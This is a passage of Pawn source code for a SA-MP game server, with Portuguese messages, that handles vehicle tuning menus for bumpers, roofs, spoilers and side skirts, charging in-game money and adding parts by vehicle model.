					    ShowPlayerDialog(playerid, DIALOG_TUNNING+5, DIALOG_STYLE_LIST, "Select a Rear Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 535)
					{
					    AddVehicleComponentEx(car,1109);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Locos Low Chromer rear bumper.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+5, DIALOG_STYLE_LIST, "Select a Rear Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 576)
					{
					    AddVehicleComponentEx(car,1192);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Locos Low Chromer rear bumper.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+5, DIALOG_STYLE_LIST, "Select a Rear Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
				}
				else
				{
				    SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Este veículo não suporta este componente");
					ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nWheels\nCar Stereo\nProxima Pagina", "Selecionar", "Sair");
				}
            }
			if(listitem == 3)//Locos Low Co. Cars Salmin Rear Bumper
            {
                if(GetVehicleModel(car) == 575 ||
				GetVehicleModel(car) == 534 ||
				GetVehicleModel(car) == 567 ||
				GetVehicleModel(car) == 536 ||
				GetVehicleModel(car) == 576 ||
				GetVehicleModel(car) == 535)
			    {
			    	GivePlayerMoneyEx(playerid, -20000);

			        if(GetVehicleModel(car) == 575)
			        {
			            AddVehicleComponentEx(car,1177);
			            PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
			            SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Locos Low Slamin rear bumper.");
			            ShowPlayerDialog(playerid, DIALOG_TUNNING+5, DIALOG_STYLE_LIST, "Rear Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 534)
					{
					    AddVehicleComponentEx(car,1178);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Locos Low Slamin rear bumper.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+5, DIALOG_STYLE_LIST, "Rear Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 567)
					{
					    AddVehicleComponentEx(car,1186);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Locos Low Slamin rear bumper.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+5, DIALOG_STYLE_LIST, "Rear Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 536)
					{
					    AddVehicleComponentEx(car,1183);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Locos Low Slamin rear bumper.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+5, DIALOG_STYLE_LIST, "Rear Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}

					else if(GetVehicleModel(car) == 535)
					{
					    AddVehicleComponentEx(car,1110);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Locos Low Slamin rear bumper.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+5, DIALOG_STYLE_LIST, "Rear Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}

					else if(GetVehicleModel(car) == 576)
					{
					    AddVehicleComponentEx(car,1193);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Locos Low Slamin rear bumper.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+5, DIALOG_STYLE_LIST, "Rear Bumper", "Wheel Arch Alien bumper\nWheel Arch X-Flow bumper\nLocos Low Chromer bumper\nLocos Low Slamin bumper\nVoltar", "Selecionar", "Sair");
					}
     			}
				else
				{
				    SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Este veículo não suporta este componente");
					ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nWheels\nCar Stereo\nProxima Pagina", "Selecionar", "Sair");
				}
            }
            if(listitem == 4)//BACK
            {
                 ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nWheels\nCar Stereo\nProxima Pagina", "Selecionar", "Sair");
            }
        }
   	}
   	if(dialogid == DIALOG_TUNNING+6)//Roofs
   	{
		if(response)
		{
			if(GetPlayerMoneyEx(playerid) < 10000)
   			{
      			SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
	        	return 1;
     		}
			if(listitem == 0)//Wheel Arch Cars Alien Roof Vent
			{
                if(GetVehicleModel(car) == 562 ||
				GetVehicleModel(car) == 565 ||
				GetVehicleModel(car) == 559 ||
				GetVehicleModel(car) == 561 ||
				GetVehicleModel(car) == 560)
		        {
					GivePlayerMoneyEx(playerid, -10000);

		            if(GetVehicleModel(car) == 562)
		            {
		            	AddVehicleComponentEx(car,1035);
		            	PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
	              		SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Wheel Arch Alien roof.");
		            	ShowPlayerDialog(playerid, DIALOG_TUNNING+6, DIALOG_STYLE_LIST, "Roof", "Wheel Arch Alien Roof Vent\nWheel Arch X-Flow Roof Vent\nLocos Low Hardtop Roof\nLocos Low Softtop Roof\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 565)
					{
					    AddVehicleComponentEx(car,1054);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Wheel Arch Alien roof.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+6, DIALOG_STYLE_LIST, "Roof", "Wheel Arch Alien Roof Vent\nWheel Arch X-Flow Roof Vent\nLocos Low Hardtop Roof\nLocos Low Softtop Roof\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 559)
					{
					    AddVehicleComponentEx(car,1067);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Wheel Arch Alien roof.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+6, DIALOG_STYLE_LIST, "Roof", "Wheel Arch Alien Roof Vent\nWheel Arch X-Flow Roof Vent\nLocos Low Hardtop Roof\nLocos Low Softtop Roof\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 561)
					{
					    AddVehicleComponentEx(car,1055);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Wheel Arch Alien roof.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+6, DIALOG_STYLE_LIST, "Roof", "Wheel Arch Alien Roof Vent\nWheel Arch X-Flow Roof Vent\nLocos Low Hardtop Roof\nLocos Low Softtop Roof\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 560)
					{
					    AddVehicleComponentEx(car,1032);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Wheel Arch Alien roof.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+6, DIALOG_STYLE_LIST, "Roof", "Wheel Arch Alien Roof Vent\nWheel Arch X-Flow Roof Vent\nLocos Low Hardtop Roof\nLocos Low Softtop Roof\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 558)
					{
					    AddVehicleComponentEx(car,1088);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
				 	    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Wheel Arch Alien roof.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+6, DIALOG_STYLE_LIST, "Roof", "Wheel Arch Alien Roof Vent\nWheel Arch X-Flow Roof Vent\nLocos Low Hardtop Roof\nLocos Low Softtop Roof\nVoltar", "Selecionar", "Sair");
					}
				}
				else
				{
				    SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Este veículo não suporta este componente");
					ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nWheels\nCar Stereo\nProxima Pagina", "Selecionar", "Sair");
				}
            }
	        if(listitem == 1)//Wheel Arch Cars X-Flow Roof Vent
			{
                if(GetVehicleModel(car) == 562 ||
				GetVehicleModel(car) == 565 ||
				GetVehicleModel(car) == 559 ||
				GetVehicleModel(car) == 561 ||
				GetVehicleModel(car) == 560)
		        {
					GivePlayerMoneyEx(playerid, -10000);

			        if(GetVehicleModel(car) == 562)
			        {
			            AddVehicleComponentEx(car,1035);
			            PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
			            SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch X-Flow roof.");
			            ShowPlayerDialog(playerid, DIALOG_TUNNING+6, DIALOG_STYLE_LIST, "Roof", "Wheel Arch Alien Roof Vent\nWheel Arch X-Flow Roof Vent\nLocos Low Hardtop Roof\nLocos Low Softtop Roof\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 565)
					{
					    AddVehicleComponentEx(car,1053);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch X-Flow roof.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+6, DIALOG_STYLE_LIST, "Roof", "Wheel Arch Alien Roof Vent\nWheel Arch X-Flow Roof Vent\nLocos Low Hardtop Roof\nLocos Low Softtop Roof\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 559)
					{
					    AddVehicleComponentEx(car,1068);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch X-Flow roof.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+6, DIALOG_STYLE_LIST, "Roof", "Wheel Arch Alien Roof Vent\nWheel Arch X-Flow Roof Vent\nLocos Low Hardtop Roof\nLocos Low Softtop Roof\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 561)
					{
					    AddVehicleComponentEx(car,1061);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch X-Flow roof.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+6, DIALOG_STYLE_LIST, "Roof", "Wheel Arch Alien Roof Vent\nWheel Arch X-Flow Roof Vent\nLocos Low Hardtop Roof\nLocos Low Softtop Roof\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 560)
					{
					    AddVehicleComponentEx(car,1033);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch X-Flow roof.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+6, DIALOG_STYLE_LIST, "Roof", "Wheel Arch Alien Roof Vent\nWheel Arch X-Flow Roof Vent\nLocos Low Hardtop Roof\nLocos Low Softtop Roof\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 558)
					{
					    AddVehicleComponentEx(car,1091);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch X-Flow roof.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+6, DIALOG_STYLE_LIST, "Roof", "Wheel Arch Alien Roof Vent\nWheel Arch X-Flow Roof Vent\nLocos Low Hardtop Roof\nLocos Low Softtop Roof\nVoltar", "Selecionar", "Sair");
					}
				}
				else
				{
				    SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Este veículo não suporta este componente");
					ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nWheels\nCar Stereo\nProxima Pagina", "Selecionar", "Sair");
				}
			}
			if(listitem == 2)//Locos Low Co. Cars Hardtop Roof
			{
                if(GetVehicleModel(car) == 567 ||
				GetVehicleModel(car) == 536)
			    {
			    	GivePlayerMoneyEx(playerid, -10000);

			        if(GetVehicleModel(car) == 567)
			        {
			            AddVehicleComponentEx(car,1130);
			            PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
			            SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Locos Low Hardtop.");
			            ShowPlayerDialog(playerid, DIALOG_TUNNING+6, DIALOG_STYLE_LIST, "Roof", "Wheel Arch Alien Roof Vent\nWheel Arch X-Flow Roof Vent\nLocos Low Hardtop Roof\nLocos Low Softtop Roof\nVoltar", "Selecionar", "Sair");
					}
	   				else if(GetVehicleModel(car) == 536)
					{
					    AddVehicleComponentEx(car,1128);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Locos Low Hardtop.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+6, DIALOG_STYLE_LIST, "Roof", "Wheel Arch Alien Roof Vent\nWheel Arch X-Flow Roof Vent\nLocos Low Hardtop Roof\nLocos Low Softtop Roof\nVoltar", "Selecionar", "Sair");
					}
				}
				else
				{
        			SendClientMessage(playerid,COLOR_ERRO, " Este carro não suporta este componente, Este Componente so server nos carros Savanna e Blade!");
					ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nWheels\nCar Stereo\nProxima Pagina", "Selecionar", "Sair");
				}
            }
		    if(listitem == 3)//Locos Low Co. Cars Softtop Roof
			{
   				if(GetVehicleModel(car) == 567 ||
				GetVehicleModel(car) == 536)
			    {
       				GivePlayerMoneyEx(playerid, -10000);

			        if(GetVehicleModel(car) == 567)
			        {
			            AddVehicleComponentEx(car,1131);
			            PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
			            SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Locos Low Softtop.");
			            ShowPlayerDialog(playerid, DIALOG_TUNNING+6, DIALOG_STYLE_LIST, "Roof", "Wheel Arch Alien Roof Vent\nWheel Arch X-Flow Roof Vent\nLocos Low Hardtop Roof\nLocos Low Softtop Roof\nVoltar", "Selecionar", "Sair");
					}
	   				else if(GetVehicleModel(car) == 536)
					{
					    AddVehicleComponentEx(car,1103);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Locos Low Softtop.");
                        ShowPlayerDialog(playerid, DIALOG_TUNNING+6, DIALOG_STYLE_LIST, "Roof", "Wheel Arch Alien Roof Vent\nWheel Arch X-Flow Roof Vent\nLocos Low Hardtop Roof\nLocos Low Softtop Roof\nVoltar", "Selecionar", "Sair");
					}
					}
					else
					{
        				SendClientMessage(playerid,COLOR_ERRO, " Este carro não suporta este componente, Este Componente so server nos carros Savanna e Blade!");
						ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nWheels\nCar Stereo\nProxima Pagina", "Selecionar", "Sair");
					}
            }
            if(listitem == 4)//BACK
            {
                 ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nWheels\nCar Stereo\nProxima Pagina", "Selecionar", "Sair");
            }
     	}
   	}
   	if(dialogid == DIALOG_TUNNING+7)//Spoilers
   	{
		if(response)
		{
			if(GetPlayerMoneyEx(playerid) < 20000)
   			{
      			SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
	        	return 1;
     		}
			if(listitem == 0)//Wheel Arch Cars Alien Spoilers
			{
                if(GetVehicleModel(car) == 562 ||
				GetVehicleModel(car) == 565 ||
				GetVehicleModel(car) == 559 ||
				GetVehicleModel(car) == 561 ||
				GetVehicleModel(car) == 560)
		        {
					GivePlayerMoneyEx(playerid, -20000);

		            if(GetVehicleModel(car) == 562)
		            {
		            	AddVehicleComponentEx(car,1147);
		            	PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
	              		SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Wheel Arch Alien.");
		            	ShowPlayerDialog(playerid, DIALOG_TUNNING+7, DIALOG_STYLE_LIST, "Spoiler", "Alien Spoiler\nX-Flow Spoiler\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 565)
					{
					    AddVehicleComponentEx(car,1049);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Wheel Arch Alien.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+7, DIALOG_STYLE_LIST, "Spoiler", "Alien Spoiler\nX-Flow Spoiler\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 559)
					{
					    AddVehicleComponentEx(car,1162);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Wheel Arch Alien.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+7, DIALOG_STYLE_LIST, "Spoiler", "Alien Spoiler\nX-Flow Spoiler\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 561)
					{
					    AddVehicleComponentEx(car,1158);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Wheel Arch Alien.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+7, DIALOG_STYLE_LIST, "Spoiler", "Alien Spoiler\nX-Flow Spoiler\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 560)
					{
					    AddVehicleComponentEx(car,1138);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Wheel Arch Alien.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+7, DIALOG_STYLE_LIST, "Spoiler", "Alien Spoiler\nX-Flow Spoiler\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 558)
					{
					    AddVehicleComponentEx(car,1164);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
				 	    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Wheel Arch Alien.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+7, DIALOG_STYLE_LIST, "Spoiler", "Alien Spoiler\nX-Flow Spoiler\nVoltar", "Selecionar", "Sair");
					}
				}
				else
				{
				   	SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Este veículo não suporta este componente");
					ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nWheels\nCar Stereo\nProxima Pagina", "Selecionar", "Sair");
				}
    	    }
            if(listitem == 1)//Wheel Arch Cars X-Flow Spoilers
			{
                if(GetVehicleModel(car) == 562 ||
				GetVehicleModel(car) == 565 ||
				GetVehicleModel(car) == 559 ||
				GetVehicleModel(car) == 561 ||
				GetVehicleModel(car) == 560)
		        {
		        	GivePlayerMoneyEx(playerid, -20000);

			        if(GetVehicleModel(car) == 562)
			        {
			            AddVehicleComponentEx(car,1146);
			            PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
			            SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch X-Flow.");
			            ShowPlayerDialog(playerid, DIALOG_TUNNING+7, DIALOG_STYLE_LIST, "Spoiler", "Alien Spoiler\nX-Flow Spoiler\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 565)
					{
					    AddVehicleComponentEx(car,1150);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch X-Flow.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+7, DIALOG_STYLE_LIST, "Spoiler", "Alien Spoiler\nX-Flow Spoiler\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 559)
					{
					    AddVehicleComponentEx(car,1158);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch X-Flow.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+7, DIALOG_STYLE_LIST, "Spoiler", "Alien Spoiler\nX-Flow Spoiler\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 561)
					{
					    AddVehicleComponentEx(car,1060);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch X-Flow.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+7, DIALOG_STYLE_LIST, "Spoiler", "Alien Spoiler\nX-Flow Spoiler\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 560)
					{
					    AddVehicleComponentEx(car,1139);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch X-Flow.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+7, DIALOG_STYLE_LIST, "Spoiler", "Alien Spoiler\nX-Flow Spoiler\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 558)
					{
					    AddVehicleComponentEx(car,1163);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch X-Flow.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+7, DIALOG_STYLE_LIST, "Spoiler", "Alien Spoiler\nX-Flow Spoiler\nVoltar", "Selecionar", "Sair");
					}
				}
				else
				{
				    SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Este veículo não suporta este componente");
					ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nWheels\nCar Stereo\nProxima Pagina", "Selecionar", "Sair");
				}
            }
            if(listitem == 2)//BACK
            {
                 ShowPlayerDialog(playerid, DIALOG_TUNNING, DIALOG_STYLE_LIST, "Tunning Menu","Paint Jobs\nColors\nExhausts\nFront Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts\nBullbars\nWheels\nCar Stereo\nProxima Pagina", "Selecionar", "Sair");
            }
  	 	}
   	}
   	if(dialogid == DIALOG_TUNNING+8)//Sideskirts
   	{
		if(response)
		{

			if(GetPlayerMoneyEx(playerid) < 10000)
   			{
      			SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
	        	return 1;
     		}
			if(listitem == 0)//Wheel Arch Cars Alien Sideskirts
			{
                if(GetVehicleModel(car) == 562 ||
				GetVehicleModel(car) == 565 ||
				GetVehicleModel(car) == 559 ||
				GetVehicleModel(car) == 561 ||
				GetVehicleModel(car) == 560)
		        {
					GivePlayerMoneyEx(playerid, -10000);

		            if(GetVehicleModel(car) == 562)
		            {
		            	AddVehicleComponentEx(car,1036);
		            	AddVehicleComponentEx(car,1040);
		            	PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
	              		SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch Alien Side.");
		            	ShowPlayerDialog(playerid, DIALOG_TUNNING+8, DIALOG_STYLE_LIST, "SideSkirt", "Wheel Arch Alien Side Skirts\nWheel Arch X-Flow Side Skirts\nLocos Low Chrome Strip\nLocos Low Chrome Flames\nLocos Low Chrome Arches\nLocos Low Chrome Trim\nLocos Low Wheelcovers\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 565)
					{
					    AddVehicleComponentEx(car,1047);
					    AddVehicleComponentEx(car,1051);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch Alien Side.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+8, DIALOG_STYLE_LIST, "SideSkirt", "Wheel Arch Alien Side Skirts\nWheel Arch X-Flow Side Skirts\nLocos Low Chrome Strip\nLocos Low Chrome Flames\nLocos Low Chrome Arches\nLocos Low Chrome Trim\nLocos Low Wheelcovers\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 559)
					{
					    AddVehicleComponentEx(car,1069);
					    AddVehicleComponentEx(car,1071);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch Alien Side.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+8, DIALOG_STYLE_LIST, "SideSkirt", "Wheel Arch Alien Side Skirts\nWheel Arch X-Flow Side Skirts\nLocos Low Chrome Strip\nLocos Low Chrome Flames\nLocos Low Chrome Arches\nLocos Low Chrome Trim\nLocos Low Wheelcovers\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 561)
					{
					    AddVehicleComponentEx(car,1056);
					    AddVehicleComponentEx(car,1062);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch Alien Side.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+8, DIALOG_STYLE_LIST, "SideSkirt", "Wheel Arch Alien Side Skirts\nWheel Arch X-Flow Side Skirts\nLocos Low Chrome Strip\nLocos Low Chrome Flames\nLocos Low Chrome Arches\nLocos Low Chrome Trim\nLocos Low Wheelcovers\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 560)
					{
					    AddVehicleComponentEx(car,1026);
					    AddVehicleComponentEx(car,1027);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
					    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch Alien Side.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+8, DIALOG_STYLE_LIST, "SideSkirt", "Wheel Arch Alien Side Skirts\nWheel Arch X-Flow Side Skirts\nLocos Low Chrome Strip\nLocos Low Chrome Flames\nLocos Low Chrome Arches\nLocos Low Chrome Trim\nLocos Low Wheelcovers\nVoltar", "Selecionar", "Sair");
					}
					else if(GetVehicleModel(car) == 558)
					{
					    AddVehicleComponentEx(car,1090);
					    AddVehicleComponentEx(car,1094);
					    PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
				 	    SendClientMessage(playerid,COLOR_CHAT,"Adicionaste um Arch Alien Side.");
					    ShowPlayerDialog(playerid, DIALOG_TUNNING+8, DIALOG_STYLE_LIST, "SideSkirt", "Wheel Arch Alien Side Skirts\nWheel Arch X-Flow Side Skirts\nLocos Low Chrome Strip\nLocos Low Chrome Flames\nLocos Low Chrome Arches\nLocos Low Chrome Trim\nLocos Low Wheelcovers\nVoltar", "Selecionar", "Sair");
					}
				}
				else
				{
				    SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Este veículo não suporta este componente");
